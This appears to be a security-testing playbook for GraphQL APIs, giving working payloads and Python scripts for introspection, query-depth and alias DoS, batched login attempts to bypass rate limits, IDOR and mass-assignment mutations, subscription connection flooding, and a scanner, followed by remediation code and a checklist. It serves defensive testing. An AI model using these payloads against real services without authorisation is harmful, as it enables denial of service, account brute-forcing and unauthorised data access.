---
name: graphql_depth_testing
description: Advanced GraphQL security testing including introspection, depth attacks, and query complexity analysis
---

# GraphQL Security Testing

## Overview
GraphQL APIs have unique attack surfaces compared to REST. Testing must cover introspection abuse, query depth attacks, field suggestion exploitation, and batch query abuse.

## Testing Methodology

### 1. Introspection Testing

#### Check if Introspection is Enabled
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType { name }
        }
      }
    }
  }
}
```

#### Extract Full Schema
```python
import requests
import json

def extract_graphql_schema(endpoint, headers=None):
    """Extract complete GraphQL schema via introspection"""
    introspection_query = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name
          kind
          description
          fields {
            name
            description
            args {
              name
              type { name kind ofType { name } }
            }
            type { name kind ofType { name kind } }
          }
          inputFields {
            name
            type { name kind ofType { name } }
          }
          enumValues { name }
        }
      }
    }
    """
    
    response = requests.post(
        endpoint,
        json={"query": introspection_query},
        headers=headers or {}
    )
    
    return response.json()
```

### 2. Query Depth Attacks

#### Nested Query for DoS
```graphql
query DeepNestedQuery {
  user {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  comments {
                    content
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

#### Circular Reference Attack
```graphql
query CircularReference {
  user {
    friends {
      friends {
        friends {
          friends {
            name
          }
        }
      }
    }
  }
}
```

#### Test Query Depth Limit
```python
def generate_depth_payload(depth):
    """Generate nested query of specified depth"""
    query = "query { " + "user { " * depth + "name " + "} " * depth + "}"
    return {"query": query}

def test_depth_limit(endpoint, max_depth=100):
    """Test if query depth is limited"""
    for depth in [10, 50, 100, 200]:
        payload = generate_depth_payload(depth)
        response = requests.post(endpoint, json=payload)
        
        if response.status_code == 200:
            print(f"Depth {depth}: ALLOWED (potential DoS)")
        else:
            print(f"Depth {depth}: BLOCKED")
            return depth
    return None
```

### 3. Query Complexity Attacks

#### High Complexity Query
```graphql
query HighComplexity {
  users {
    id
    name
    email
    posts {
      id
      title
      content
      comments {
        id
        body
        author {
          name
          email
          posts {
            id
            title
          }
        }
      }
    }
  }
}
```

#### Alias-Based Complexity
```graphql
query AliasAttack {
  user1: user(id: 1) { name email }
  user2: user(id: 2) { name email }
  user3: user(id: 3) { name email }
  user4: user(id: 4) { name email }
  user5: user(id: 5) { name email }
  # ... repeat with hundreds of aliases
}
```

```python
def generate_alias_payload(num_aliases=1000):
    """Generate alias-based complexity attack"""
    aliases = [f"user{i}: user(id: {i}) {{ name email }}" for i in range(num_aliases)]
    query = "query { " + " ".join(aliases) + " }"
    return {"query": query}
```

### 4. Field Suggestion Exploitation

#### Check for Field Suggestions
```graphql
query {
  usr { name }
}
```

Response might include:
```json
{
  "errors": [{
    "message": "Cannot query field 'usr' on type 'Query'. Did you mean 'user'?"
  }]
}
```

#### Enumerate Fields via Suggestions
```python
def enumerate_via_suggestions(endpoint, field_name):
    """Use field suggestions to enumerate schema"""
    query = f"query {{ {field_name} {{ __typename }} }}"
    response = requests.post(endpoint, json={"query": query})
    
    errors = response.json().get("errors", [])
    for error in errors:
        if "Did you mean" in error.get("message", ""):
            # Extract suggested field name
            suggested = error["message"].split("Did you mean")[1].strip("?")
            return suggested
    return None
```

### 5. Batch Query Abuse

#### Batch Query for Rate Limit Bypass
```python
def generate_batch_query(queries, operation_name=None):
    """Generate batch query payload"""
    return {
        "operations": [
            {"query": q, "operationName": operation_name}
            for q in queries
        ]
    }

# Test rate limiting with batch queries
batch = [
    "mutation { login(email: \"admin@test.com\", password: \"pass123\") { token } }"
    for _ in range(100)
]

payload = generate_batch_query(batch)
response = requests.post(endpoint, json=payload)
```

### 6. Mutation Testing

#### IDOR via Mutations
```graphql
mutation UpdateUser {
  updateUser(id: "other_user_id", input: { email: "hacked@evil.com" }) {
    id
    email
  }
}
```

#### Mass Assignment
```graphql
mutation CreateUser {
  createUser(input: {
    name: "Hacker"
    email: "hacker@evil.com"
    role: "admin"  # Should not be settable
  }) {
    id
    role
  }
}
```

### 7. Subscription Testing

#### Subscription for Data Exfiltration
```graphql
subscription {
  onNewMessage {
    content
    sender {
      email
    }
  }
}
```

#### Subscription DoS
```python
import asyncio
import websockets
import json

async def subscription_dos(endpoint, num_connections=100):
    """Open many subscription connections"""
    connections = []
    
    for i in range(num_connections):
        try:
            ws = await websockets.connect(endpoint)
            subscription = {
                "type": "connection_init",
                "payload": {}
            }
            await ws.send(json.dumps(subscription))
            connections.append(ws)
        except Exception as e:
            print(f"Connection {i} failed: {e}")
            break
    
    print(f"Opened {len(connections)} connections")
    
    # Keep connections open
    await asyncio.sleep(60)
    
    for ws in connections:
        await ws.close()
```

### 8. Authorization Testing

#### Vertical Privilege Escalation
```graphql
# Regular user trying to access admin query
query {
  adminUsers {
    id
    email
    role
  }
}
```

#### Horizontal Privilege Escalation
```graphql
# User A accessing User B's data
query {
  user(id: "other_user_id") {
    email
    phone
    address
  }
}
```

### 9. Error-Based Information Disclosure

#### Trigger Detailed Errors
```graphql
query {
  user(id: null) {
    name
  }
}
```

```graphql
mutation {
  updateUser(id: "", input: { email: "not-an-email" }) {
    id
  }
}
```

### 10. Tools and Scripts

#### GraphQL Scanner Script
```python
#!/usr/bin/env python3
"""GraphQL security scanner"""
import requests
import json
import sys

class GraphQLScanner:
    def __init__(self, endpoint, headers=None):
        self.endpoint = endpoint
        self.headers = headers or {}
        self.findings = []
    
    def check_introspection(self):
        """Check if introspection is enabled"""
        query = "{ __schema { types { name } } }"
        response = self.post(query)
        
        if response.get("data") and response["data"].get("__schema"):
            self.findings.append({
                "type": "INTROSPECTION_ENABLED",
                "severity": "MEDIUM",
                "description": "GraphQL introspection is enabled"
            })
            return True
        return False
    
    def test_query_depth(self, max_depth=50):
        """Test query depth limiting"""
        for depth in [10, 25, 50, 100]:
            query = "query { " + "user { " * depth + "name " + "} " * depth + "}"
            response = self.post(query)
            
            if response.get("data"):
                self.findings.append({
                    "type": "NO_DEPTH_LIMIT",
                    "severity": "HIGH",
                    "description": f"Query depth {depth} allowed"
                })
                return depth
        return None
    
    def test_batch_queries(self):
        """Test batch query support"""
        batch = [
            {"query": "{ __typename }"}
            for _ in range(10)
        ]
        
        response = requests.post(
            self.endpoint,
            json=batch,
            headers=self.headers
        )
        
        if response.status_code == 200 and isinstance(response.json(), list):
            self.findings.append({
                "type": "BATCH_QUERIES_ALLOWED",
                "severity": "MEDIUM",
                "description": "Batch queries supported - potential rate limit bypass"
            })
            return True
        return False
    
    def post(self, query, variables=None):
        """Execute GraphQL query"""
        payload = {"query": query}
        if variables:
            payload["variables"] = variables
        
        response = requests.post(
            self.endpoint,
            json=payload,
            headers=self.headers
        )
        
        return response.json()
    
    def run_all_tests(self):
        """Run all GraphQL security tests"""
        print("Starting GraphQL security scan...")
        
        print("1. Checking introspection...")
        self.check_introspection()
        
        print("2. Testing query depth...")
        self.test_query_depth()
        
        print("3. Testing batch queries...")
        self.test_batch_queries()
        
        print(f"\nScan complete. Found {len(self.findings)} issues.")
        for finding in self.findings:
            print(f"  [{finding['severity']}] {finding['description']}")
        
        return self.findings

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python graphql_scanner.py <endpoint>")
        sys.exit(1)
    
    scanner = GraphQLScanner(sys.argv[1])
    scanner.run_all_tests()
```

### 11. Remediation Guidance

#### Disable Introspection in Production
```javascript
// Apollo Server
const server = new ApolloServer({
  introspection: process.env.NODE_ENV !== 'production',
  // ... other options
});
```

```python
# Graphene (Python)
from graphql import GraphQLError

def custom_introspection_enabled(context):
    return False  # Disable introspection
```

#### Implement Query Depth Limiting
```javascript
// Apollo Server
const depthLimit = require('graphql-depth-limit');

const server = new ApolloServer({
  validationRules: [depthLimit(10)],  // Max depth of 10
});
```

#### Implement Query Complexity Analysis
```javascript
const depthLimit = require('graphql-depth-limit');
const { createComplexityRule } = require('graphql-query-complexity');

const server = new ApolloServer({
  validationRules: [
    depthLimit(10),
    createComplexityRule({
      maximumComplexity: 1000,
      estimators: [
        fieldExtensionsEstimator(),
        simpleEstimator({ defaultComplexity: 1 })
      ],
      onComplete: (complexity) => {
        console.log('Query complexity:', complexity);
      }
    })
  ]
});
```

#### Rate Limiting
```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests'
});

app.use('/graphql', limiter);
```

#### Persisted Queries
```javascript
// Only allow pre-approved queries
const server = new ApolloServer({
  persistedQueries: {
    cache: new KeyValueCache(),
  },
});
```

## Validation Checklist

- [ ] Introspection disabled in production
- [ ] Query depth limited (recommended: 10-15)
- [ ] Query complexity analyzed and limited
- [ ] Batch queries rate-limited or disabled
- [ ] Field suggestions disabled in production
- [ ] Proper authorization on all resolvers
- [ ] Error messages don't leak internals
- [ ] Subscriptions have connection limits
